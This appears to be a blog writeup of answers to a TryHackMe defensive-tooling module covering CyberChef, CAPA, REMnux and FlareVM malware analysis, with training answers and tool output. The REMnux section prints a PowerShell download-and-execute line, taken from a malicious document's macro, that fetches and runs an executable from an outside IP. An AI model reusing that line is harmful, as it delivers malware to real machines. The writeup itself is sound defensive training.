---
title: Defensive Security Tooling Module
date: 2025-11-22
draft: false
tags:
  - TryHackMe
  - Cybersecurity
  - Defense
---
**Note:** 

- This is a combined writeup for the Defensive Security Tooling Module.
- The questions are shortened for a cleaner view
- Questions that are straightforward will only have answers attached. Such questions can be easily answered by reading the documentation given in the room.


# CyberChef: The Basics 


## Task  1 & 2 

No answer needed

---
## Task  3 - Navigating the Interface

#### 1) In which area can you find "From Base64"?

**Ans:** `operations`

#### 2) Which area is considered the heart of the tool?

**Ans:** `Recipe`

---
## Task  4 - Before Anything Else

#### 1) At which step would you determine, "What do I want to accomplish?

**Ans:** `1`

---
## Task  5 - Practice, Practice, Practice

#### 1) What is the hidden email address?

*Under Extractors, choose Extract email address option.*

**Ans:** `hidden@hotmail.com`

#### 2) What is the hidden IP address that ends in .232?

*Under Extractors, choose Extract IP address option.*

```
102.20.11.232
10.10.2.10
```

**Ans:** `102.20.11.232`

#### 3) Which domain address starts with the letter "T"?

*Under Extractors, choose Extract domains option.*

```
TryHackMe.com
hotmail.com
```

**Ans:** `TryHackMe.com`

#### 4) What is the binary value of the decimal number 78?

*Under Data format, choose From Decimal and then To Binary. You can then input 78 and get the required output or just do that math yourself !*

**Ans:** `01001110`

#### 5) What is the URL encoded value of...?

*Under Data format, choose URL Encode and ensure you check the 'Encode all special chars' option.*

**Ans:** `https%3A%2F%2Ftryhackme%2Ecom%2Fr%2Fcareers`

---
## 6) Your First Official Cook

#### 1) Using the file you downloaded in Task 5, which IP starts...?

*We already found the 2 IPs and only one of them matches the conditions.*

```
102.20.11.232
10.10.2.10
```

**Ans:** `10.10.2.10`

#### 2) What is the base64 encoded value of the string "**Nice Room!**"?

*Under Data format, choose To Base64 and then input the string.*

**Ans:** `TmljZSBSb29tIQ==`

#### 3) What is the URL decoded value for...?

*Under Data format, choose URL Decode and then input the URL.*

**Ans:** `https://tryhackme.com/r/room/cyberchefbasics`

#### 4) What is the datetime string for the Unix timestamp `1725151258`?

*Under Date / Time, choose From UNIX Timestamp and then input the timestamp.*

**Ans:** `Sun 1 September 2024 00:40:58 UTC`

#### 5)  What is the Base85 decoded string of the value `<+oue+DGm>Ap%u7`?

*Under Data format, choose From Base85 and then input the string.*

**Ans:** `This is fun!`

---
# CAPA: The Basics 

## Task 1 - Introduction

No answer needed

---
## Task 2 - Tool Overview: How CAPA Works

#### 1) What command-line option would you use if you need to check...?

**Ans:** `-h`

#### 2) What command-line options are used to find detailed information...?

**Ans:** `-v`

#### 3) What command-line options do you use to find very verbose...?

**Ans:** `-vv`

#### 4) What PowerShell command will you use to read the content of a file?

**Ans:** `Get-Content`

---
## Task 3 - Dissecting CAPA Results Part 1

*Open powershell, navigate to the required directory and run the following command:*

```bash
Get-Content .\cryptobot.txt
```
#### 1) What is the sha256 of cryptbot.bin?

**Ans:** `ae7bc6b6f6ecb206a7b957e4bb86e0d11845c5b2d9f7a00a482bef63b567ce4c`

#### 2) What is the **Technique** Identifier of **Obfuscated Files or Information**?

**Ans:** `T1027`

#### 3) What is the **Sub-Technique** Identifier of **Obfuscated Files**...?

**Ans:** `T1027.005`

#### 4) When CAPA tags a file with this MAEC value, it indicates that...?

**Ans:** `launcher`

#### 4) When CAPA tags a file with this MAEC value, it indicates that...?

**Ans:** `Downloader`

---
## Task 4 - Dissecting CAPA Results Part 2

#### 1) What serves as a catalogue of malware objectives and behaviours?

**Ans:** `Malware Behavior Catalogue`

#### 2)  Which field is based on ATT&CK tactics in the context of malware behaviour?

**Ans:** `Objective`

#### 3) What is the Identifier of **"Create Process**" micro-behavior?

*You can take a look at the report generated. Notice the MBC Objective - PROCESS row.*

**Ans:** `C0017`

#### 4) What is the behaviour with an Identifier of **B0009**?

*Notice the MBC  Objective - ANTI -BEHAVIORAL ANALYSIS row.*

**Ans:** `Virtual Machine Detection`

#### 5) Malware can be used to obfuscate data using base64 and XOR...?

*Notice the MBC Objective - DATA row.*

**Ans:** `Encode Data`

#### 6) Which micro-behavior refers to...?

*Notice the MBC Objective - COMMUNICATION row.*

**Ans:** `HTTP Communication`

---
## Task 5 - Dissecting CAPA Results Part 3

#### 1) Which top-level Namespace contains a set of rules specifically...?

**Ans:** `anti-analysis`

#### 2)  Which namespace contains rules to...?

**Ans:** `anti-vm/vm-detection`

#### 3) Which Top-Level Namespace contains rules related to...?

**Ans:** `persistence`

#### 4) Which namespace addresses techniques such as...?

**Ans:** `obfuscation`

#### 5) Which Top-Level Namespace Is a **staging ground**...?

**Ans:** `Nursery`

---
## Task 6 - Dissecting CAPA Results Part 4

#### 1) What **rule yaml file** was matched if the...?

*Just add '-' where there are spaces.*

**Ans:** `check-http-status-code.yml`

#### 2)  What is the **name of the Capability** if the rule YAML file is...?

**Ans:** `reference anti-vm strings`

#### 3) Which **TLN** or Top-Level Namespace includes the Capability...?

*Notice the run Powershell expression row.*

**Ans:** `load-code`

#### 4) What is the **value of the API** that ends in `Ex` is it looking for?

```yaml
rule:
  meta:
    name: check for Windows sandbox via registry
    namespace: anti-analysis/anti-vm/vm-detection
    authors:
      - "@_re_fox"
    scopes:
      static: function
      dynamic: thread
    att&ck:
      - Defense Evasion::Virtualization/Sandbox Evasion::System Checks [T1497.001]
    mbc:
      - Anti-Behavioral Analysis::Virtual Machine Detection [B0009]
    references:
      - https://github.com/LloydLabs/wsb-detect
    examples:
      - 773290480d5445f11d3dc1b800728966:0x140001140
  features:
    - and:
      - api: RegOpenKeyEx
      - api: RegEnumValue
      - substring: "\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
      - string: /wmic useraccount where \"name='WDAGUtilityAccount'\"/i
```

**Ans:** `RegOpenKeyEx`

---
## Task 7 - More Information, more fun!

#### 1) Which parameter allows you to output the result of CAPA into a **.json file**?

**Ans:** `-j`

#### 2)  What tool allows you to interactively explore CAPA results...?

**Ans:** `CAPA Web Explorer`

#### 3)  Which feature of this CAPA Web Explorer allows you to filter...?

**Ans:** `Global Search Box`

---
# REMnux: Getting Started

## Task 1 & 2 

No answer needed

---
## Task 3 - File Analysis

*Following the instructions given in the task this is what I was able to find:*

```powershell
powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;
```

#### 1) What Python tool analyzes OLE2 files, commonly called...?

**Ans:** `oledump.py`

#### 2)  What tool parameter we used in this task allows you to select a...?

**Ans:** `-s`

#### 3)  What command is commonly used for downloading files from the internet...?

**Ans:** `Invoke-WebRequest`

#### 4)  What file was being downloaded using the PowerShell script?

**Ans:** `Doc-3737122pdf.exe`

#### 5)  Where will the file being downloaded be stored?

**Ans:** `$TempFile`

#### 6)  How many data streams were presented for this file?

*Run the following command: (ensure you are in the right directory)*

```bash
oledump.py possible_malicious.docx
```

```bash
  1:       114 '\x01CompObj'
  2:       280 '\x05DocumentSummaryInformation'
  3:       416 '\x05SummaryInformation'
  4:      7557 '1Table'
  5:    343998 'Data'
  6:       376 'Macros/PROJECT'
  7:        41 'Macros/PROJECTwm'
  8: M 1989192 'Macros/VBA/ThisDocument'
  9:      4099 'Macros/VBA/_VBA_PROJECT'
 10:       515 'Macros/VBA/dir'
 11:       112 'ObjectPool/_1649178531/\x01CompObj'
 12:        16 'ObjectPool/_1649178531/\x03OCXNAME'
 13:         6 'ObjectPool/_1649178531/\x03ObjInfo'
 14:        86 'ObjectPool/_1649178531/f'
 15:         0 'ObjectPool/_1649178531/o'
 16:      4096 'WordDocument'
```

**Ans:** `16`

#### 7)  At what data stream number does the tool indicate a macro present?

*Look for the `M` tag:*

```bash
8: M 1989192 'Macros/VBA/ThisDocument'
```

**Ans:** `8`

---
## Task 4 - Fake Network to Aid Analysis

#### 1) Download and scan the file named **flag.txt** from the terminal using...?

*Run the following command on your Attackbox: (ensure that you have inetsim set up and working)*

```bash
wget https://10.49.179.109/flag.txt --no-check-certificate
```

```bash
cat flag.txt
```

```
This is the default text document for INetSim HTTP server fake mode.

This file is plain text.

You found it! The flag is = Tryhackme{remnux_edition}
```

**Ans:** `Tryhackme{remnux_edition}`

#### 2)  Based on the report, what URL Method was used to get the file flag.txt?

*Over at the REMnux VM, once I stopped the server, this is what I got:*

```bash
Simulation stopped.
 Report written to '/var/log/inetsim/report/report.2210.txt' (13 lines)
=== INetSim main process stopped (PID 2210) ===
```

*Heading over to the logs directory and viewing the file:*

```bash
sudo cat report.2210.txt
```

```bash
=== Report for session '2210' ===

Real start date            : 2025-11-23 10:36:24
Simulated start date       : 2025-11-23 10:36:24
Time difference on startup : none

2025-11-23 10:38:12  First simulated date in log file
2025-11-23 10:38:12  HTTPS connection, method: GET, URL: https://10.49.179.109/, file name: /var/lib/inetsim/http/fakefiles/sample.html
2025-11-23 10:38:12  HTTPS connection, method: GET, URL: https://10.49.179.109/favicon.ico, file name: /var/lib/inetsim/http/fakefiles/favicon.ico
2025-11-23 10:39:55  HTTPS connection, method: GET, URL: https://10.49.179.109/flag.txt, file name: /var/lib/inetsim/http/fakefiles/sample.txt
2025-11-23 10:39:55  Last simulated date in log file

===
```

*I could have taken a wild guess that it was going to be `GET` anyway but I decided to do it this way for practice !*

**Ans:** `GET`

---
## Task 5 - Memory Investigation: Evidence Preprocessing

#### 1) What plugin lists processes in a tree based on their parent process ID?

**Ans:** `PsTree`

#### 2)  What plugin is used to list all currently active processes in the machine?

**Ans:** `PsList`

#### 3)  What Linux utility tool can extract the ASCII, 16-bit little-endian...?

**Ans:** `strings`

#### 4) By running vol3 with the Malfind parameter, what is the first...?

*I followed the task instructions and prepped the evidence for analysis, hence I can just view the reports:*

```bash 
cat wcry.windows.malfind.Malfind.txt
```

```bash
PID	Process	Start VPN	End VPN	Tag	Protection	CommitCharge	PrivateMemory	File output	Hexdump	Disasm

596	csrss.exe	0x7f6f0000	0x7f7effff	Vad 	PAGE_EXECUTE_READWRITE	0	0	Disabled	
c8 00 00 00 8b 01 00 00	........
ff ee ff ee 08 70 00 00	.....p..
08 00 00 00 00 fe 00 00	........
00 00 10 00 00 20 00 00	........
00 02 00 00 00 20 00 00	........
8d 01 00 00 ff ef fd 7f	........
03 00 08 06 00 00 00 00	........
00 00 00 00 00 00 00 00	........	
0x7f6f0000:	enter	0, 0
0x7f6f0004:	mov	eax, dword ptr [ecx]
0x7f6f0006:	add	byte ptr [eax], al
620	winlogon.exe	0x21400000	0x21403fff	VadS	PAGE_EXECUTE_READWRITE	4	1	Disabled	
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 00 00 00 00	........
00 00 00 00 28 00 28 00	....(.(.
01 00 00 00 00 00 00 00	........	
```

**Ans:** `csrss.exe`

#### 5)  What is the second (2nd) process identified suspected...?

*Looking at the results gotten from the previous question, the process is:*

**Ans:** `winlogon.exe`

#### 6)  By running vol3 with the DllList parameter, what is the file path...?

*We can take a look at the reports and use grep to make things easier. Run the following command:*

```bash
cat wcry.windows.dlllist.DllList.txt | grep "@WanaDecryptor@.exe"
```

```bash
740	@WanaDecryptor@	0x400000	0x3d000	@WanaDecryptor@.exe	C:\Intel\ivecuqmanpnirkt615\@WanaDecryptor@.exe	N/A	Disabled
```

**Ans:** `C:\Intel\ivecuqmanpnirkt615`

---
# FlareVM: Arsenal of Tools

## Task 1 - Introduction

No answer needed 

---
## Task 2 - Arsenal of Tools

#### 1) Which tool is an Open-source debugger for binaries in x64 and x32 formats?

**Ans:** `x64dbg`

#### 2)  What tool is designed to analyze and edit Portable Executable (PE) files?

**Ans:** `CFF Explorer`

#### 3)  Which tool is considered a sophisticated memory...?

**Ans:** `Process Hacker`

#### 4)  Which tool is considered a sophisticated memory...?

**Ans:** `Process Hacker`

#### 5) What tool can be used to view and edit a binary file?

**Ans:** `HxD`

---
## Task 3 - Commonly Used Tools for Investigation: Overview

#### 1) Which tool was formerly known as FireEye Labs Obfuscated String Solver?

**Ans:** `FLOSS`

#### 2)  Which tool offers in-depth insights into the active processes...?

**Ans:** `Process Explorer`

#### 3)  By using the Process Explorer (procexp) tool, under what process...?

**Ans:** `System`

#### 4)  Which powerful Windows tool is designed to help you record...?

**Ans:** `Procmon`

#### 5) Which tool can be used for Static analysis or studying executable file...?

**Ans:** `PEStudio`

#### 6) What is the sha256 value of the file?

*Open pestudio and import the .bin file and look at the sha256 property.*

**Ans:** `E9627EBAAC562067759681DCEBA8DDE8D83B1D813AF8181948C549E342F67C0E`

#### 7) How many functions does it have?

*Click on the functions section in the tree view over at the left.*

**Ans:** `102`

#### 8) What tool can generate file hashes for integrity verification...?

**Ans:** `CFF Explorer`

#### 9) What is the MD5 of the file?

*Open CFF Explorer and import the .txt file and look at the MD5 property.*

**Ans:** `646698572AFBBF24F50EC5681FEB2DB7`

#### 10) What is the e_magic value of the file?
*In the Dos Header section look at the Value field.*

**Ans:** `5A4D`

----
## Task 4 - Analyzing Malicious Files!

*Most of the questions have the steps already attached, so I won't be listing every single one*

#### 1) What is the **entropy value** of the file windows.exe?

**Ans:** `7.999`

#### 2)  What is the value under **requestedExecutionLevel**?

```
ï»¿<?xml version="1.0" encoding="utf-8"?>
<assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1">
  <assemblyIdentity version="1.0.0.0" name="Program.app"/>
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
    <security>
      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false" />
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>
```

**Ans:** `requireAdministrator`

#### 3)  Which function allows the process to use the operating system's...?

*Under the functions section in pestudio, look at the one that is blacklisted.*

**Ans:** `set_UseShellExecute`

#### 4)  Which API starts with R and indicates...?

**Ans:** `RijndaelManaged`

#### 5) What is the Imphash of cobaltstrike.exe

*Close the current session, open pestudio again and import the new .exe file.*

**Ans:** `92EEF189FB188C541CBD83AC8BA4ACF5`

#### 6)  What is the defanged IP address to which the process cobaltstrike.exe...?

*Can be found under the TCP/IP Properties of the file in Process Explorer. Ensure the format is correct:*

**Ans:** `47[.]120[.]46[.]210`

#### 7) What is the destination port number used by cobaltstrike.exe...?

**Ans:** `81`

#### 8)  What is the **parent process** of cobaltstrike.exe?

*Look at the tree to understand the structure.*

**Ans:** `explorer.exe`

---
